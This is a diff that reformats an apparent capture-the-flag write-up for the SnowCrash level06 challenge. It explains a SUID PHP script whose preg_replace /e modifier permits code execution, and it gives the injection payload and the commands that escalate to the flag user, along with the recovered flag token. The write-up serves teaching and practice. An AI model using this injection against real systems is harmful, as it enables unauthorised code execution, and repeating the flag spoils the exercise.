@@ -1,6 +1,14 @@
+# Level06
+
+## Flag
+
+wiok45aaoguiboiki2tuin6ub
+
+## Discovery
 We have
 6 on the level
 
+```bash
 dr-xr-x---+ 1 level06 level06  140 Mar  5  2016 ./
 d--x--x--x  1 root    users    340 Aug 30  2015 ../
 -r-x------  1 level06 level06  220 Apr  3  2012 .bash_logout*
@@ -8,11 +16,11 @@ d--x--x--x  1 root    users    340 Aug 30  2015 ../
 -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06*
 -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php*
 -r-x------  1 level06 level06  675 Apr  3  2012 .profile*
-
+```
 The level06 file has a special SUID bit (rwsr-x---+). This bit means that when someone executes this file, it is executed with the rights of the file owner, not the user who started it. In this case, the owner of the file is flag06, meaning that when it is executed, the program will run with the flag06 user rights, not yours.
 
 This file may be vulnerable to exploitation.
-
+```bash
 level06@SnowCrash:~$ cat level06.php 
 #!/usr/bin/php
 <?php
@@ -34,7 +42,7 @@ $r = x($argv[1], $argv[2]);
 print $r;
 
 ?>
-
+```
 
 Code analysis level06.php
 This PHP script performs input data processing and uses the vulnerable preg_replace() construct with the e modifier, which makes it vulnerable to code execution (RCE - Remote Code Execution).
@@ -53,24 +61,24 @@ If the transferred file contains the string [x something], then this something w
 
 The y() function replaces . on x, and @ on y, but generally leaves it possible to execute the code.
 
-Vulnerability Exploitation (RCE)
+## Vulnerability Exploitation (RCE)
 Step 1: Create a file with the code that executes the getflag command
 So how level06.php reads files, we need to create a file containing code that will make it execute the getflag command.
-
+```bash
 echo "[x `getflag`]" > /tmp/exploit.txt
-
+```
 This file contains a string that, when processed through preg_replace("/(\[x(.*)\])/e", "y(\"\\2\")", $ a); will execute getflag.
 
 Step 2: Run the script with our file
 Now we are passing this file as an argument.:
-
+```bash
 ./level06 /tmp/exploit.txt
 
 echo "[x `getflag`]" > /tmp/exploit.txt It didn't work
 
 echo '[x ${`getflag`} ]' > /tmp/exploit.txt
 ./level06 /tmp/exploit.txt
-
+```
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
  in /home/user/level06/level06.php(4) : regexp code on line 1
 
